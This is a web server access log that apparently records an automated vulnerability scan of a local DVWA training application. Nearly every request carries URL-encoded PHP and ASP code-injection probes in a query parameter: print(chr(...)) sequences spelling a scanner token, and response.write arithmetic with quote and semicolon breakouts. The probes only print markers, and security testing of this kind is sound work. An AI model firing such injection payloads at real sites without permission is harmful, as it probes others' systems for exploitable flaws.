172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 301 826 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 301 826 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 301 808 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 301 814 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 301 796 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 301 642 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 301 612 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 301 834 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 301 834 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 301 816 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 301 822 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 301 804 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 301 650 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 301 624 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa/css/login.css?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 301 840 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 301 840 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 301 822 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 301 828 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 301 810 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/css/main.css?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 301 656 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/logo.png?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/login_logo.png?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
